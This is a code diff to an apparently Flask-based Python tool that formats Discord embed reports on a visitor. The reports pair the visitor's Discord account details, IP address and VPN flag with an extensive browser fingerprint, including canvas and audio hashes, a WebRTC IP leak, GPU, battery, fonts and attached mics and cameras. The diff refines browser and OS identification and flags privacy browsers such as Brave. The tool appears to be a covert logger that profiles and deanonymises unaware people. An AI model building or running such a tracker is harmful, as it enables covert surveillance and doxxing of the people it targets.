@@ -116,39 +116,121 @@ def nitro_label(t: int) -> str:
     return {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}.get(t, "None")
 
 
-def parse_ua(ua: str) -> tuple[str, str]:
-    browser, os_name = "Unknown", "Unknown"
-    for pat, tpl in [
-        (r"Edg/(\d+)",            "Edge {}"),
-        (r"OPR/(\d+)",            "Opera {}"),
-        (r"YaBrowser/(\d+)",      "Yandex {}"),
-        (r"SamsungBrowser/(\d+)", "Samsung Browser {}"),
-        (r"Firefox/(\d+)",        "Firefox {}"),
-        (r"Chrome/(\d+)",         "Chrome {}"),
-    ]:
-        m = re.search(pat, ua)
-        if m:
-            browser = tpl.format(m.group(1))
-            break
-    else:
-        m = re.search(r"Version/(\d+).*Safari", ua)
-        if m:
-            browser = f"Safari {m.group(1)}"
+def parse_browser_and_os(ua: str, fp: dict) -> tuple[str, str]:
+    """
+    Returns (browser_string, os_string) using the best available source:
+    1. UA Client Hints (fp.uaHints) — most accurate, Chromium only
+    2. fp.isBrave flag — Brave hides as Chrome in UA, needs JS detection
+    3. Classic UA string regex — fallback for Firefox, Safari, older browsers
+    """
+    hints     = fp.get("uaHints", {})
+    is_brave  = fp.get("isBrave", False)
 
-    if   "Windows NT 10.0" in ua: os_name = "Windows 10/11"
-    elif "Windows NT 6.3"  in ua: os_name = "Windows 8.1"
-    elif "Windows NT 6.1"  in ua: os_name = "Windows 7"
-    elif "Windows"         in ua: os_name = "Windows"
-    elif "Macintosh"       in ua:
-        m = re.search(r"Mac OS X ([\d_]+)", ua)
-        os_name = f"macOS {m.group(1).replace('_','.')}" if m else "macOS"
-    elif "CrOS"    in ua: os_name = "ChromeOS"
-    elif "Android" in ua:
-        m = re.search(r"Android ([\d.]+)", ua)
-        os_name = f"Android {m.group(1)}" if m else "Android"
-    elif "iPhone"  in ua: os_name = "iOS (iPhone)"
-    elif "iPad"    in ua: os_name = "iOS (iPad)"
-    elif "Linux"   in ua: os_name = "Linux"
+    # ── Browser ───────────────────────────────────────────────────────────────
+    browser = "Unknown"
+
+    # Brave is detected by JS — must check before anything else since it
+    # deliberately reports itself as Chrome in every UA and Client Hints field
+    if is_brave:
+        m = re.search(r"Chrome/(\d+)", ua)
+        browser = f"Brave {m.group(1)}" if m else "Brave"
+
+    # UA Client Hints fullVersionList gives the true browser name & full version
+    elif hints.get("fullVersionList"):
+        # Filter out noise brands ("Not_A Brand", "Chromium")
+        priority = ["Microsoft Edge", "Opera", "Yandex", "Samsung", "Vivaldi",
+                    "DuckDuckGo", "Brave", "Chrome"]
+        brands   = {b["brand"]: b["version"]
+                    for b in hints["fullVersionList"]
+                    if "not" not in b["brand"].lower()}
+        for name in priority:
+            for brand, ver in brands.items():
+                if name.lower() in brand.lower():
+                    # Use major version only for cleanliness
+                    major = ver.split(".")[0]
+                    browser = f"{brand} {major}"
+                    break
+            if browser != "Unknown":
+                break
+        # Generic Chromium fallback from hints
+        if browser == "Unknown" and brands:
+            name, ver = next(iter(brands.items()))
+            browser = f"{name} {ver.split('.')[0]}"
+
+    # Classic UA regex fallback (works for all browsers)
+    if browser == "Unknown":
+        for pat, tpl in [
+            (r"Edg/(\d+)",              "Microsoft Edge {}"),
+            (r"OPR/(\d+)",              "Opera {}"),
+            (r"YaBrowser/(\d+)",        "Yandex {}"),
+            (r"SamsungBrowser/(\d+)",   "Samsung Internet {}"),
+            (r"DuckDuckGo/(\d+)",       "DuckDuckGo {}"),
+            (r"Vivaldi/(\d+)",          "Vivaldi {}"),
+            (r"Firefox/(\d+)",          "Firefox {}"),
+            (r"FxiOS/(\d+)",            "Firefox iOS {}"),
+            (r"CriOS/(\d+)",            "Chrome iOS {}"),
+            (r"Chrome/(\d+)",           "Chrome {}"),
+        ]:
+            m = re.search(pat, ua)
+            if m:
+                browser = tpl.format(m.group(1))
+                break
+        else:
+            m = re.search(r"Version/(\d+).*Safari", ua)
+            if m:
+                browser = f"Safari {m.group(1)}"
+            elif "Safari" in ua:
+                browser = "Safari"
+
+    # ── OS ────────────────────────────────────────────────────────────────────
+    os_name = "Unknown"
+
+    # Client Hints gives accurate platform + version (distinguishes Win 10 vs 11)
+    if hints.get("platform"):
+        platform = hints["platform"]
+        if platform == "Windows":
+            # fp.windowsVersion is set by JS based on platformVersion
+            os_name = fp.get("windowsVersion", "Windows 10/11")
+        elif platform == "macOS":
+            pv = hints.get("platformVersion", "")
+            os_name = f"macOS {pv}" if pv else "macOS"
+        elif platform == "Linux":
+            os_name = "Linux"
+        elif platform == "Android":
+            pv = hints.get("platformVersion", "")
+            os_name = f"Android {pv}" if pv else "Android"
+        elif platform in ("iOS", "iPadOS"):
+            pv = hints.get("platformVersion", "")
+            os_name = f"{platform} {pv}" if pv else platform
+        elif platform == "Chrome OS":
+            os_name = "ChromeOS"
+        else:
+            os_name = platform
+
+    # UA fallback (always works, slightly less precise for Windows)
+    if os_name == "Unknown":
+        if   "Windows NT 10.0" in ua:
+            os_name = fp.get("windowsVersion", "Windows 10/11")
+        elif "Windows NT 6.3"  in ua: os_name = "Windows 8.1"
+        elif "Windows NT 6.2"  in ua: os_name = "Windows 8"
+        elif "Windows NT 6.1"  in ua: os_name = "Windows 7"
+        elif "Windows"         in ua: os_name = "Windows"
+        elif "Macintosh"       in ua:
+            m = re.search(r"Mac OS X ([\d_]+)", ua)
+            os_name = f"macOS {m.group(1).replace('_','.')}" if m else "macOS"
+        elif "CrOS"    in ua: os_name = "ChromeOS"
+        elif "Android" in ua:
+            m = re.search(r"Android ([\d.]+)", ua)
+            os_name = f"Android {m.group(1)}" if m else "Android"
+        elif "iPhone"  in ua: os_name = "iOS (iPhone)"
+        elif "iPad"    in ua: os_name = "iPadOS"
+        elif "Linux"   in ua: os_name = "Linux"
+
+    # Append architecture if available (e.g. "Windows 11 (arm64)")
+    arch = hints.get("architecture", fp.get("architecture", ""))
+    if arch and arch not in ("x86", "x86_64", ""):
+        os_name = f"{os_name} ({arch})"
+
     return browser, os_name
 
 
@@ -210,7 +292,7 @@ def build_embeds(discord_data: dict, ip: str, ip_info: dict, fp: dict) -> list[d
     color  = 0xED4245 if is_vpn else 0x57F287
 
     ua_raw           = fp.get("userAgent") or "Unknown"
-    browser, os_name = parse_ua(ua_raw)
+    browser, os_name = parse_browser_and_os(ua_raw, fp)
 
     def v(key, fallback="N/A"):
         val = fp.get(key)
@@ -218,30 +300,60 @@ def build_embeds(discord_data: dict, ip: str, ip_info: dict, fp: dict) -> list[d
 
     lang       = v("language",  request.headers.get("Accept-Language","?").split(",")[0])
     languages  = v("languages")
-    platform   = v("platform",  os_name)
     screen     = v("screen")
     dpr        = v("devicePixelRatio")
     window_sz  = v("windowSize")
     avail_s    = v("availScreen")
     color_d    = v("colorDepth")
-    tz_fp      = v("timezone")
     cpu        = v("hardwareConcurrency")
     mem        = v("deviceMemory")
     touch      = v("maxTouchPoints", "0")
     webgl      = v("webGL")
     webgl_vend = v("webGLVendor")
     canvas_h   = v("canvasHash")
-    audio_fp   = v("audioFingerprint")
     dnt        = v("doNotTrack")
     cookies    = fp.get("cookieEnabled")
     adblock    = fp.get("adBlock", False)
+    is_brave   = fp.get("isBrave", False)
     webrtc     = v("webRTC")
     connection = v("connection")
     battery    = v("battery")
-    plugins    = v("plugins")
     a_in       = v("audioInputs")
     a_out      = v("audioOutputs")
     v_in       = v("videoInputs")
+    fonts      = v("fonts")
+
+    # Audio FP — show "Blocked (Privacy Browser)" for Brave/Firefox strict
+    audio_raw     = fp.get("audioFingerprint")
+    audio_blocked = fp.get("audioBlocked", False)
+    if audio_blocked or not audio_raw:
+        audio_fp = "🛡️ Blocked (privacy mode)"
+    else:
+        audio_fp = audio_raw
+
+    # WebRTC — "Blocked" is meaningful for Brave users
+    if webrtc in ("Blocked", "N/A", ""):
+        webrtc_disp = "🛡️ Blocked" if (is_brave or webrtc == "Blocked") else "N/A"
+    else:
+        webrtc_disp = f"`{webrtc}`"
+
+    # Plugins — trim redundant PDF viewer copies
+    raw_plugins = fp.get("plugins", "")
+    if raw_plugins and raw_plugins not in ("N/A", "None"):
+        plugin_list = [p.strip() for p in raw_plugins.split(",")]
+        # Keep only the first PDF viewer variant, drop the rest
+        pdf_seen = False
+        clean_plugins = []
+        for p in plugin_list:
+            if "pdf" in p.lower():
+                if not pdf_seen:
+                    clean_plugins.append("PDF Viewer")
+                    pdf_seen = True
+            else:
+                clean_plugins.append(p)
+        plugins = ", ".join(clean_plugins) or "None"
+    else:
+        plugins = raw_plugins or "N/A"
 
     discrim_str = f"#{discrim}" if discrim not in ("0", "", None) else ""
     badge_str   = ",  ".join(f"`{b}`" for b in badges) if badges else "None"
@@ -271,24 +383,24 @@ def build_embeds(discord_data: dict, ip: str, ip_info: dict, fp: dict) -> list[d
     )
 
     device_val = (
-        f"🌐  **{browser}**\n"
-        f"🖥️  **{os_name}**  (`{platform}`)\n"
+        f"🌐  **{browser}**{'  🛡️ Brave' if is_brave and 'Brave' not in browser else ''}\n"
+        f"🖥️  **{os_name}**\n"
         f"🌍  {lang}  •  All: {languages}\n"
         f"📺  {screen} @ {dpr}×  •  Window: {window_sz}\n"
-        f"🖥️  Available: {avail_s}  •  {color_d}\n"
-        f"🕐  TZ: {tz_fp}\n"
+        f"🖥️  Available: {avail_s}  •  Colour: {color_d}\n"
         f"⚡  CPU: **{cpu}** cores  •  RAM: **{mem}** GB\n"
         f"👆  Touch points: {touch}\n"
         f"🎮  GPU: {webgl}\n"
         f"🏭  GPU Vendor: {webgl_vend}\n"
         f"🖼️  Canvas hash: `{canvas_h}`\n"
-        f"🎵  Audio FP: `{audio_fp}`\n"
-        f"📡  WebRTC leak: `{webrtc}`\n"
+        f"🎵  Audio FP: {audio_fp}\n"
+        f"📡  WebRTC leak: {webrtc_disp}\n"
         f"📶  Connection: {connection}\n"
         f"🔋  Battery: {battery}\n"
         f"🔇  AdBlock: {'✅ Yes' if adblock else '❌ No'}  •  "
         f"DNT: {dnt}  •  Cookies: {'✅' if cookies else '❌'}\n"
         f"🎙️  Mic: {a_in}  •  Cam: {v_in}  •  Speakers: {a_out}\n"
+        f"🔤  Fonts: {fonts}\n"
         f"🧩  Plugins: {plugins}"
     )
 
